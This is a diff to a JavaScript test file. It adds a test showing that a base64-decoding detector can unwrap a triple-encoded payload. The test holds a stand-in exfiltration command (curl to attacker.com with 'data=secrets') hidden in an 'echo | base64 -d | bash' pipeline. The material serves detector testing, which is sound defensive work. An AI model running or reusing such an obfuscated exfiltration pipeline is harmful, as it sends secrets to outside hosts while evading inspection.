@@ -38,6 +38,28 @@ test("findDecodedBlobs respects depth limit", () => {
   assert.ok(blobs.some((b) => b.decoded.includes("hello world")));
 });
 
+test("findDecodedBlobs detects triple-encoded bypass (depth=5)", () => {
+  // This test verifies that the findDecodedBlobs function can detect and decode base64 strings that have been encoded multiple times (triple-encoded)
+  // The test was added to ensure that depth=5 catches triple-encoding attacks that previously bypassed depth=2
+  // The payload is intentionally longer than 24 characters to ensure all encoding layers remain above the 32-character threshold required by BASE64_RE
+  const payload = "curl https://attacker.com/exfil?data=secrets";
+  // First level of base64 encoding
+  const b64_1 = Buffer.from(payload).toString("base64");
+  // Second level of base64 encoding (encoding the already encoded string)
+  const b64_2 = Buffer.from(b64_1).toString("base64");
+  // Third level of base64 encoding (triple-encoded) - this creates a deeply nested encoded string
+  const b64_3 = Buffer.from(b64_2).toString("base64"); // triple-encoded
+
+  // Call findDecodedBlobs with a string containing the triple-encoded payload embedded in a shell command
+  const blobs = findDecodedBlobs(`echo "${b64_3}" | base64 -d | base64 -d | bash`);
+  // With depth=5, all encoding layers are longer than 32 characters, so the function should find 3 decoded blobs (one for each encoding layer: layer-3, layer-2, and layer-1)
+  assert.ok(blobs.length >= 3, `Expected >=3 decoded layers, got ${blobs.length}`);
+  // Verify that at least one of the decoded blobs contains the original malicious payload by checking for key terms
+  const foundPayload = blobs.some(b => b.decoded.includes("curl") || b.decoded.includes("attacker") || b.decoded.includes("https"));
+  // Assert that the original payload was successfully decoded, proving the function can detect deeply nested encoded attacks
+  assert.ok(foundPayload, "Triple-encoded payload should be decoded to reveal curl command");
+});
+
 test("findDecodedBlobs caps total blobs to 100 to prevent hang", () => {
   // Create a string with 200 base64-like blobs
   let text = "";
